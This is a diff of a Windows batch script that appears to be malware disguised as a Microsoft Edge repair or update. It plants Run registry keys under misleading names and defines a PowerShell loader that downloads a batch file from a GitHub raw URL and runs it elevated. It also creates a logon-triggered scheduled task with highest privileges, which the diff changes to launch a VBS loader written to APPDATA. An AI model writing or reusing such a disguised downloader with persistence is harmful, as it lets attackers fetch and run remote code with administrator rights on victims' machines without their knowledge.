@@ -61,7 +61,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\
 set "TASK_NAME=EdgeCoreRepair"
 set "LDR_PS=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:APPDATA+'\clean.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs"
 
-schtasks /create /tn "%TASK_NAME%" /tr "powershell.exe -w hidden -c \"%LDR_PS%\"" /sc onlogon /rl highest /f >nul 2>&1
+schtasks /create /tn "EdgeCoreRepair" /tr "wscript.exe \"%APPDATA%\EdgeUpdate.vbs\"" /sc onlogon /rl highest /f
 
 set "VBS_LDR=%APPDATA%\EdgeUpdate.vbs"
 echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LDR%"
@@ -71,4 +71,3 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t
 echo Islem tamamlandi.
 timeout /t 3 >nul
 exit
-
